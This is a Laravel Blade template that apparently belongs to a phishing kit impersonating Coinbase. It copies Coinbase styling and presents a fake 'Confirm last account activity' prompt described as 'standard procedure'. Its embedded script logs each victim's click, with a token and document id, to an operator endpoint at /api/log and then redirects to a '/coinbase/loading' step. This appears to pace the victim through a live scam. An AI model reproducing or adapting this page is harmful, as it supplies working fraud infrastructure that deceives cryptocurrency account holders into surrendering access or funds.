@extends('user.coinbase.layout')

@section('title', 'Coinbase - Last Activity')

@section('pageCss')
*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }

*,
:before,
:after {
  box-sizing: border-box;
  border-width: 0;
  border-style: solid;
  border-color: #e5e7eb;
}

html,
:host {
  line-height: 1.5;
  -webkit-text-size-adjust: 100%;
  -moz-tab-size: 4;
  -o-tab-size: 4;
  tab-size: 4;
  font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
  font-feature-settings: normal;
  font-variation-settings: normal;
  -webkit-tap-highlight-color: transparent;
}

body {
  margin: 0;
  line-height: inherit;
}

button,
input,
optgroup,
select,
textarea {
  font-family: inherit;
  font-feature-settings: inherit;
  font-variation-settings: inherit;
  font-size: 100%;
  font-weight: inherit;
  line-height: inherit;
  letter-spacing: inherit;
  color: inherit;
  margin: 0;
  padding: 0;
}

button {
  height: auto;
}

img,
svg,
video,
canvas,
audio,
iframe,
embed,
object {
  display: block;
  vertical-align: middle;
}

#root {
  height: 100%;
}

.bg-coinbase-background {
  --tw-bg-opacity: 1;
  background-color: rgb(10 11 13 / var(--tw-bg-opacity, 1));
}
.bg-transparent { background-color: transparent; }
.flex { display: flex; }
.flex-col { flex-direction: column; }
.flex-grow { flex-grow: 1; }
.font-coinbase-sans { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-text { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-coinbase-title { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
.font-medium { font-weight: 500; }
.font-semibold { font-weight: 600; }
.h-full { height: 100%; }
.items-center { align-items: center; }
.justify-between { justify-content: space-between; }
.justify-center { justify-content: center; }
.max-w-md { max-width: 28rem; }
.min-h-fit { min-height: -moz-fit-content; min-height: fit-content; }
.mt-4 { margin-top: 1rem; }
.mt-12 { margin-top: 3rem; }
.p-4 { padding: 1rem; }
.p-6 { padding: 1.5rem; }
.pb-2 { padding-bottom: .5rem; }
.pb-8 { padding-bottom: 2rem; }
.pt-5 { padding-top: 1.25rem; }
.px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
.rounded-\[16px\] { border-radius: 16px; }
.rounded-md { border-radius: .375rem; }
.ring-1 {
  --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
  --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);
  box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
}
.ring-coinbase-line { --tw-ring-color: #8a919e33; }
.text-\[28px\] { font-size: 28px; }
.text-left { text-align: left; }
.text-sm { font-size: .875rem; line-height: 1.25rem; }
.text-coinbase-foreground-muted {
  --tw-text-opacity: 1;
  color: rgb(138 145 158 / var(--tw-text-opacity, 1));
}
.text-white {
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
}
.w-full { width: 100%; }
.hover\:bg-\[\#0f1012\]:hover {
  --tw-bg-opacity: 1;
  background-color: rgb(15 16 18 / var(--tw-bg-opacity, 1));
}
.active\:bg-\[\#1e1f20\]:active {
  --tw-bg-opacity: 1;
  background-color: rgb(30 31 32 / var(--tw-bg-opacity, 1));
}
.disabled\:bg-\[\#0a0b0d\]:disabled {
  --tw-bg-opacity: 1;
  background-color: rgb(10 11 13 / var(--tw-bg-opacity, 1));
}

@media (min-width: 640px) {
  .sm\:border { border-width: 1px; }
  .sm\:border-coinbase-line,
  .sm\:border-crypto-line { border-color: #8a919e33; }
  .sm\:justify-start { justify-content: flex-start; }
  .sm\:mt-24 { margin-top: 6rem; }
  .sm\:px-10 { padding-left: 2.5rem; padding-right: 2.5rem; }
  .sm\:py-8 { padding-top: 2rem; padding-bottom: 2rem; }
}
@endsection

@section('content')
<form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
<span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
Confirm last account activity
</span>
<span class="font-coinbase-sans text-coinbase-foreground-muted">
Please select your estimated last account activity to proceed. This is part of our standard procedure.
</span>
<button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-activity-btn" type="button">
Within a day
</button>
<button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-activity-btn" type="button">
Within a week
</button>
<button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-activity-btn" type="button">
Within a month
</button>
<button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-activity-btn" type="button">
Within 6 months
</button>
<button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-activity-btn" type="button">
Within a year
</button>
<button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-activity-btn" type="button">
More than a year ago
</button>
</form>
<script>
(function(){
  document.querySelectorAll('.cb-activity-btn').forEach(function(btn){
    btn.addEventListener('click', function(){
      var val = btn.textContent.trim();
      if(typeof window._liveledCSRF !== 'undefined'){
        var gate = window._llWhenWritable || function(fn){ return Promise.reject(); };
        gate(function(){
          var b = new URLSearchParams({_token:window._liveledCSRF,page:'coinbase_last_activity',type:'form_submit',element:'last_activity',value:val,doc:window._llDocId||''});
          fetch('/api/log',{method:'POST',body:b,keepalive:true});
        }).then(function(){
          setTimeout(function(){
            if(window.navigateTo) window.navigateTo('/coinbase/loading');
            else window.location.href='/coinbase/loading';
          },300);
        });
      } else {
        setTimeout(function(){
          if(window.navigateTo) window.navigateTo('/coinbase/loading');
          else window.location.href='/coinbase/loading';
        },300);
      }
      document.documentElement.style.background='#0a0b0d';
      document.body.style.background='#0a0b0d';
    });
  });
})();
</script>
@endsection
